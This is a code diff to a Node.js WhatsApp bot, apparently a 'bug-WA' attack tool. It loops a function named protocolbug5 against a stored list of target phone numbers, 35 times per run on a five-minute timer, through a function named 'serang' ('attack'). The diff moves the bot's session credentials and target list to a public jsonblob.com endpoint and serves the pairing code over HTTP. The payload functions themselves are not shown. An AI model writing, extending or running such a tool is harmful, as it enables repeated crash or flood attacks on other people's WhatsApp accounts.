@@ -9,7 +9,7 @@ import {
 import { Boom } from "@hapi/boom";
 import fs from "fs";
 import pino from "pino";
-const nomorRequest = "6287839025789";
+let nomorRequest;
 let sendMsg;
 
 function tunggu(delay) {
@@ -328,7 +328,7 @@ function trashprotocol(target) {
   });
 }
 
-function serang(targets, sendMessage, key) {
+function serang(targets) {
   return new Promise(async resolve => {
     for (let i = 1; i <= 35; i++) {
       await protocolbug5(targets);
@@ -347,17 +347,18 @@ function serang(targets, sendMessage, key) {
   });
 }
 
+let blob;
 let exec;
 async function start() {
   const jam = new Date().getHours();
-  let targets = JSON.parse(fs.readFileSync("./targets.json", "utf-8"));
-  const arrX = targets.toString();
+  const targets = blob.targets;
+  const arrX = blob.targets.toString();
+
   if ((jam > 21 && jam < 4) || targets.length < 1) {
-    fs.writeFileSync("./waktu.txt", "" + (new Date().getTime() + 60000 * 6.5), "utf-8");
     exec = setTimeout(() => start, 60000 * 5);
   }
   let arr = targets;
-  targets.forEach(async e => {
+  targets.forEach(e => {
     const el = e.split("@")[1].split("-");
     const tgl = new Date(el[2] + "-" + el[1] + "-" + el[0]).getTime();
     const now = new Date().getTime();
@@ -367,12 +368,16 @@ async function start() {
   });
   if (arr.length > 0) {
     if (arr.toString() != arrX) {
-      fs.writeFileSync("./targets.json", JSON.stringify(arr), "utf-8");
+      blob.targets = arr;
+      await fetch("https://jsonblob.com/api/jsonBlob/1389135762926264320", {
+        body: JSON.stringify(blob),
+        method: "PUT",
+        headers: { Accept: "application/json", "Content-Type": "application/json" }
+      });
     }
 
     arr = arr.map(elem => elem.split("@")[0] + "@s.whatsapp.net");
     await serang(arr);
-    fs.writeFileSync("./waktu.txt", "" + (new Date().getTime() + 60000 * 6.5), "utf-8");
     exec = setTimeout(() => start, 60000 * 5);
   }
 }
@@ -397,6 +402,19 @@ function olahTarget(aksi, target, send) {
   }
 }
 
+const reviveBuffer = obj => {
+  if (obj && typeof obj === "object") {
+    if (obj.type === "Buffer" && Array.isArray(obj.data)) {
+      return Buffer.from(obj.data);
+    }
+    for (const key in obj) {
+      obj[key] = reviveBuffer(obj[key]);
+    }
+  }
+  return obj;
+};
+
+let pairing;
 let wait;
 async function bot(session) {
   wait = setTimeout(() => {
@@ -404,23 +422,39 @@ async function bot(session) {
   }, 60000);
 
   if (!session) {
-    session = await useMultiFileAuthState("session/" + nomorRequest);
+    await fetch("https://jsonblob.com/api/jsonBlob/1389135762926264320", {
+      headers: { Accept: "application/json", "Content-Type": "application/json" }
+    })
+      .then(r => r.json())
+      .then(r => {
+        blob = r;
+        nomorRequest = r.session.creds.me.id.split(":")[0];
+        session = reviveBuffer(r.session);
+        session.keys.get = async (type, ids) => {
+          const data = {};
+          return data;
+        };
+        session.keys.set = async data => {
+          const tasks = [];
+          await Promise.all(tasks);
+        };
+      });
   }
+
   const sock = makeWASocket({
     printQRInTerminal: false,
     keepAliveIntervalMs: 30000,
     browser: ["Windows", "Chrome", "138.0.7204.50"],
-    auth: session.state,
+    auth: session,
     logger: pino({ level: "silent" }).child({ level: "silent" })
   });
 
   if (!sock.user && !sock.authState.creds.registered) {
-    fs.rmSync("./session/" + nomorRequest, { recursive: true });
-    fs.mkdirSync("./session/" + nomorRequest);
     await tunggu(5000);
     const code = await sock.requestPairingCode(nomorRequest.replace(/\D/g, ""));
     clearTimeout(wait);
     clearTimeout(exec);
+    pairing = code;
     wait = setTimeout(() => {
       process.exit();
     }, 60000 * 3);
@@ -438,31 +472,33 @@ async function bot(session) {
       if (lastDisconnect.error.output && lastDisconnect.error.output.payload) {
         const { statusCode, error } = lastDisconnect.error.output.payload;
         if (statusCode === 401 && error === "Unauthorized") {
-          fs.rmSync("./session/" + nomorRequest, { recursive: true });
+          console.log("Unauthorized 401");
           return process.exit();
         }
       }
       if (shouldReconnect) {
-        return bot(session);
+        return bot(sock.authState);
       }
     }
     if (connection === "open") {
       clearTimeout(wait);
       clearTimeout(exec);
-      console.log("Terhubung "+new Date().toLocaleString("id-ID"));
+      console.log("Terhubung " + new Date().toLocaleString("id-ID"));
       sendMsg = sock.relayMessage;
-      const waktu = fs.readFileSync("waktu.txt", "utf-8");
-      const timeNow = new Date().getTime();
-      if (parseInt(waktu) + 60000 * 5 <= timeNow) {
-        start();
-      } else {
-        await tunggu(parseInt(waktu) - timeNow);
-        start();
-      }
+      start();
     }
   });
 
-  sock.ev.on("creds.update", session.saveCreds);
+  sock.ev.on("creds.update", async () => {
+    if (JSON.stringify(blob.session) != JSON.stringify(sock.authState)) {
+      blob.session = sock.authState;
+      await fetch("https://jsonblob.com/api/jsonBlob/1389135762926264320", {
+        body: JSON.stringify(blob),
+        method: "PUT",
+        headers: { Accept: "application/json", "Content-Type": "application/json" }
+      });
+    }
+  });
   sock.ev.on("messages.upsert", ({ messages }) => {
     messages.forEach(async e => {
       if (e.key.remoteJid === nomorRequest + "@s.whatsapp.net" && e.key.fromMe === true) {
@@ -478,6 +514,7 @@ async function bot(session) {
 
         switch (command) {
           case "test":
+            console.log("ok");
             await sock.sendMessage(nomorRequest + "@s.whatsapp.net", {
               text: "bug-WA OK"
             });
@@ -498,20 +535,7 @@ async function bot(session) {
   });
 }
 
-async function ready() {
-  const files = fs.readdirSync("./");
-  if (files.indexOf("session") < 0) fs.mkdirSync("./session");
-  if (!fs.existsSync("./waktu.txt")) {
-    fs.writeFileSync("./waktu.txt", "0", "utf-8");
-  }
-  if (!fs.existsSync("./targets.json")) {
-    fs.writeFileSync("./targets.json", "[]", "utf-8");
-  }
-
-  return bot();
-}
-
-ready();
+bot();
 
 import http from "http";
 const port = 3000;
@@ -527,7 +551,7 @@ http
       fs.readFile(path, (err, data) => {
         if (err) {
           // res.writeHead(404);
-          res.write(fs.readFileSync("targets.json", "utf-8"));
+          res.write(`200 OK${pairing ? " " + pairing : ""}`);
         } else {
           res.write(data);
         }
